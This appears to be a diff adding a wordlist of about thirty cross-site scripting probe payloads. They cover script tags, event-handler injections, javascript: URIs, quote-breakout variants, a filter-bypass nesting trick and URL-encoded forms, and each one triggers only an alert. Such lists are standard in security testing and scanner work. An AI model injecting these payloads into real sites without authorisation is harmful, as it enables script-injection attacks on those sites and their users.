@@ -1,0 +1,30 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+"><iframe src=javascript:alert(1)>
+<a href=javascript:alert(1)>x</a>
+'-alert(1)-'
+";alert(1);//
+</script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=alert(document.domain)>
+<svg><script>alert(1)</script></svg>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+"><details/open/ontoggle=alert(1)>
+<x onclick=alert(1)>click
+%3Cscript%3Ealert(1)%3C/script%3E
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<svg/onload=alert(1)//
+'"><svg onload=alert(1)>
